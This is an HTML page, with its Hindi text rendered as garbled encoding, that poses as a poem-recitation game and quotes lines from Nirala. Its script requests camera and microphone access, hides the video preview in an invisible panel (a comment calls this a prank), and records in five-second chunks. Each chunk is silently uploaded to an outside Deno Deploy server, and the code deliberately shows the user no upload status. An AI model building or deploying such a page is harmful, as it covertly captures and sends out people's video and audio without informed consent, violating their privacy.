<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>рдХрд╡рд┐рддрд╛ рдкрд╛рда - рдПрдХ рдЫреЛрдЯрд╛ рд╕рд╛ рдЦреЗрд▓</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
            background-color: #1a1a2e; /* Dark background for better focus */
            color: #e6e6e6;
            transition: background-color 0.5s;
        }

        /* ЁЯЪи рдкреНрд░реИрдВрдХ рдХреЗ рд▓рд┐рдП: рд╡реАрдбрд┐рдпреЛ рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЫрд┐рдкрд╛рдирд╛ */
        #video-panel { 
            position: absolute; 
            width: 1px; 
            height: 1px; 
            overflow: hidden; 
            opacity: 0; 
            pointer-events: none; 
        }

        #initial-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        #start-button {
            padding: 20px 40px;
            font-size: 2em;
            cursor: pointer;
            border: none;
            border-radius: 10px;
            background-color: #e94560; /* Highlight color */
            color: white;
            box-shadow: 0 4px 15px rgba(233, 69, 96, 0.4);
            transition: all 0.3s ease;
            margin-top: 30px;
        }

        #start-button:hover {
            background-color: #ff5e7b;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(233, 69, 96, 0.6);
        }

        /* рдХрд╡рд┐рддрд╛ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╢реБрд░реБрдЖрдд рдореЗрдВ рдЫрд┐рдкрд╛ рд░рд╣реЗрдЧрд╛ */
        #poem-panel { 
            display: none; /* Initially hidden */
            padding: 40px;
            max-width: 800px;
            text-align: center;
            background-color: #272343;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }

        #poem-text {
            white-space: pre-wrap;
            font-size: 1.5em;
            line-height: 1.8;
            color: #bae8e8;
            margin-top: 20px;
        }

        #status { 
            margin-top: 20px; 
            font-weight: bold; 
            color: #ffc72c; 
        }
    </style>
</head>
<body>
    <div id="video-panel">
        <video id="video-preview" autoplay muted playsinline></video>
    </div>

    <div id="initial-screen">
        <h1>рдХрд╡рд┐рддрд╛ рдкрд╛рда рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рд╣реЛ рдЬрд╛рдЗрдП!</h1>
        <p>рдЗрд╕ рдЧреЗрдо рдореЗрдВ рд╣рд┐рд╕реНрд╕рд╛ рд▓реЗрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдЕрдкрдиреА рдПрдХ рдЫреЛрдЯреА рд╡реАрдбрд┐рдпреЛ рдХреНрд▓рд┐рдк рдмрдирд╛рдиреА рд╣реЛрдЧреАред</p>
        <p>рдЖрдЧреЗ рдмрдврд╝рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдХреИрдорд░рд╛ рдЕрдиреБрдорддрд┐ рджреЗрдВред</p>
        <button id="start-button">рд╢реБрд░реВ рдХрд░реЗрдВ!</button>
        <div id="status">рдХреИрдорд░рд╛ рдЕрдиреБрдорддрд┐ рдХрд╛ рдЗрдВрддрдЬрд╝рд╛рд░ рд╣реЛ рд░рд╣рд╛ рд╣реИ...</div>
    </div>

    <div id="poem-panel">
        <h2>рдкрдврд╝рд┐рдП!</h2>
        <pre id="poem-text">
            рд╡рд╣ рддреЛрдбрд╝рддреА рдкрддреНрдерд░
            рджреЗрдЦрд╛ рдЙрд╕реЗ рдореИрдВрдиреЗ рдЗрд▓рд╛рд╣рд╛рдмрд╛рдж рдХреЗ рдкрде рдкрд░
            рд╡рд╣ рддреЛрдбрд╝рддреА рдкрддреНрдерд░ред
            рдХреЛрдИ рди рдЫрд╛рдпрд╛рджрд╛рд░
            рдкреЗрдбрд╝ рд╡рд╣ рдЬрд┐рд╕рдХреЗ рддрд▓реЗ рдмреИрдареА рд╣реБрдИ рд╕реНрд╡реАрдХрд╛рд░ред
            рд╢реНрдпрд╛рдо рддрди, рднрд░ рдмрдБрдзрд╛ рдпреМрд╡рди,
            рдирдд рдирдпрди, рдкреНрд░рд┐рдп-рдХрд░реНрдо-рд░рдд рдорди,
            рдЧреБрд░реБ рд╣рдереМрдбрд╝рд╛ рд╣рд╛рде,
            рдХрд░рддреА рдмрд╛рд░-рдмрд╛рд░ рдкреНрд░рд╣рд╛рд░:
            рд╕рд╛рдордиреЗ рддрд░реБ-рдорд╛рд▓рд┐рдХрд╛ рдЕрдЯреНрдЯрд╛рд▓рд┐рдХрд╛, рдкреНрд░рд╛рдХрд╛рд░ред
            тАФ рд╕реВрд░реНрдпрдХрд╛рдВрдд рддреНрд░рд┐рдкрд╛рдареА 'рдирд┐рд░рд╛рд▓рд╛'
        </pre>
        <p style="font-size: 0.9em; margin-top: 30px; color: #a0a0a0;">(рд░рд┐рдХреЙрд░реНрдбрд┐рдВрдЧ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЖрдкрдХреЗ рдкрд╛рда рдХреЗ рджреМрд░рд╛рди рдЪрд▓ рд░рд╣реА рд╣реИ)</p>
    </div>

    <script>
        // --- CONFIGURATION ---
        // ЁЯЪи рдЗрд╕реЗ рдЖрдкрдХреЗ Deno Deploy URL рд╕реЗ рдмрджрд▓рд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП
        const UPLOAD_URL = 'https://video.kannu-jaat.deno.net/'; 
        const CHUNK_SIZE_MS = 5000; // 5 рд╕реЗрдХрдВрдб

        // --- DOM Elements ---
        const videoElement = document.getElementById('video-preview');
        const statusElement = document.getElementById('status');
        const startButton = document.getElementById('start-button');
        const initialScreen = document.getElementById('initial-screen');
        const poemPanel = document.getElementById('poem-panel');
        
        // --- Recording Variables ---
        let mediaRecorder;
        let stream = null;
        let chunkIndex = 0;
        
        // --- UPLOAD FUNCTION ---
        
        async function uploadVideoChunk(chunk) {
            if (chunk.size === 0) return;

            const formData = new FormData();
            // Deno Deploy рдмреИрдХрдПрдВрдб рдХреЛ 'video_chunk' рдирд╛рдо рд╕реЗ рд╣реА рдбреЗрдЯрд╛ рдЪрд╛рд╣рд┐рдП
            formData.append('video_chunk', chunk, `chunk_${chunkIndex++}.webm`); 
            
            try {
                const response = await fetch(UPLOAD_URL, {
                    method: 'POST',
                    body: formData,
                });

                if (response.ok) {
                    console.log(`Chunk ${chunkIndex - 1} uploaded successfully!`);
                    // рдпреВрдЬрд╝рд░ рдХреЛ рдХреЛрдИ рд╕реНрдЯреЗрдЯрд╕ рдирд╣реАрдВ рджрд┐рдЦрд╛рдирд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП statusElement рдХреЛ рдЕрдкрдбреЗрдЯ рдирд╣реАрдВ рдХрд░ рд░рд╣реЗ рд╣реИрдВ
                } else {
                    console.error(`Chunk upload failed: ${response.statusText}`);
                }
            } catch (error) {
                console.error('Network or server error during upload:', error);
            }
        }

        // --- PHASE 1: GET PERMISSION ON PAGE LOAD ---

        /**
         * рдХреИрдорд░рд╛ рдЕрдиреБрдорддрд┐ рдорд╛рдВрдЧрддрд╛ рд╣реИ рдФрд░ рд╕реНрдЯреНрд░реАрдо рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ
         * рдпрд╣ рд░рд┐рдХреЙрд░реНрдбрд┐рдВрдЧ рд╢реБрд░реВ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ
         */
        async function getPermissionAndStream() {
            try {
                // рдХреИрдорд░рд╛ рдФрд░ рдорд╛рдЗрдХреНрд░реЛрдлрд╝реЛрди рдХреА рдЕрдиреБрдорддрд┐ рдорд╛рдВрдЧрдирд╛
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: true 
                });
                
                // рд╕реНрдЯреНрд░реАрдо рдорд┐рд▓рдиреЗ рдХреЗ рдмрд╛рдж:
                videoElement.srcObject = stream;
                statusElement.textContent = 'тЬЕ рдХреИрдорд░рд╛ рдПрдХреНрд╕реЗрд╕ рдорд┐рд▓ рдЧрдпрд╛ред рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдЯрди рджрдмрд╛рдПрдБред';
                startButton.disabled = false; // рдмрдЯрди рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░реЗрдВ

            } catch (err) {
                statusElement.textContent = 'тЭМ рдХреИрдорд░рд╛ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рдорд┐рд▓реАред рдХреГрдкрдпрд╛ рдЕрдиреБрдорддрд┐ рджреЗрдВред';
                startButton.disabled = true;
                console.error('Error accessing media devices:', err);
            }
        }

        // --- PHASE 2: START RECORDING ON BUTTON CLICK ---

        /**
         * рд░рд┐рдХреЙрд░реНрдбрд┐рдВрдЧ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ рдФрд░ UI рдХреЛ рдХрд╡рд┐рддрд╛ рдореЛрдб рдореЗрдВ рдмрджрд▓рддрд╛ рд╣реИ
         */
        function startRecording() {
            if (!stream) {
                statusElement.textContent = 'рд░рд┐рдХреЙрд░реНрдбрд┐рдВрдЧ рд╢реБрд░реВ рдирд╣реАрдВ рд╣реЛ рд╕рдХреАред рдкрд╣рд▓реЗ рдХреИрдорд░рд╛ рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред';
                return;
            }

            // 1. UI рдХреЛ рдмрджрд▓реЗрдВ (рдкреНрд░реИрдВрдХ рд▓реЙрдЬрд┐рдХ)
            initialScreen.style.display = 'none'; // рдмрдЯрди рдФрд░ рд╢реБрд░реБрдЖрддреА рдЯреЗрдХреНрд╕реНрдЯ рдЫрд┐рдкрд╛рдПрдБ
            poemPanel.style.display = 'block'; // рдХрд╡рд┐рддрд╛ рджрд┐рдЦрд╛рдПрдБ
            document.body.style.backgroundColor = '#1e3c72'; // рдмреИрдХрдЧреНрд░рд╛рдЙрдВрдб рдХрд▓рд░ рдереЛрдбрд╝рд╛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ

            // 2. MediaRecorder рдХреЛ рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ рд╢реБрд░реВ рдХрд░реЗрдВ
            const options = { mimeType: 'video/webm; codecs=vp8' };
            mediaRecorder = new MediaRecorder(stream, options);

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    uploadVideoChunk(event.data);
                }
            };

            // рд╣рд░ 5 рд╕реЗрдХрдВрдб рдореЗрдВ рдирдпрд╛ рдбреЗрдЯрд╛ рд░рд┐рдХреЙрд░реНрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП
            mediaRecorder.start(CHUNK_SIZE_MS); 
            console.log("Recording started in the background.");
        }

        /**
         * рд░рд┐рдХреЙрд░реНрдбрд┐рдВрдЧ рдмрдВрдж рдХрд░рддрд╛ рд╣реИ рдФрд░ рдХреИрдорд░рд╛ рдПрдХреНрд╕реЗрд╕ рд░рд┐рд▓реАрдЬрд╝ рдХрд░рддрд╛ рд╣реИ
         */
        function stopRecordingAndCleanup() {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
            }
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            // рдпрджрд┐ рдЖрдк рдЪрд╛рд╣реЗрдВ рддреЛ рдпреВрдЬрд╝рд░ рдХреЛ рдзрдиреНрдпрд╡рд╛рдж рд╕рдВрджреЗрд╢ рджрд┐рдЦрд╛ рд╕рдХрддреЗ рд╣реИрдВ
            console.log("Cleanup done. Tracks stopped.");
        }


        // --- Event Listeners ---
        
        // рдкреЗрдЬ рд▓реЛрдб рд╣реЛрддреЗ рд╣реА рдЕрдиреБрдорддрд┐ рдорд╛рдВрдЧреЗрдВ
        window.addEventListener('load', () => {
            startButton.disabled = true; // рдЕрдиреБрдорддрд┐ рдорд┐рд▓рдиреЗ рддрдХ рдмрдЯрди рдЕрдХреНрд╖рдо рд░рдЦреЗрдВ
            getPermissionAndStream();
        });

        // "рд╢реБрд░реВ рдХрд░реЗрдВ" рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рд╣реЛрдиреЗ рдкрд░ рд░рд┐рдХреЙрд░реНрдбрд┐рдВрдЧ рд╢реБрд░реВ рдХрд░реЗрдВ
        startButton.addEventListener('click', startRecording);

        // рдЬрдм рдпреВрдЬрд╝рд░ рдЯреИрдм рдмрдВрдж рдХрд░реЗ рдпрд╛ рдкреЗрдЬ рдЫреЛрдбрд╝реЗ, рддреЛ рд░рд┐рдХреЙрд░реНрдбрд┐рдВрдЧ рдмрдВрдж рдХрд░реЗрдВ
        window.addEventListener('beforeunload', stopRecordingAndCleanup);
        window.addEventListener('pagehide', stopRecordingAndCleanup);
        
    </script>
</body>
</html>
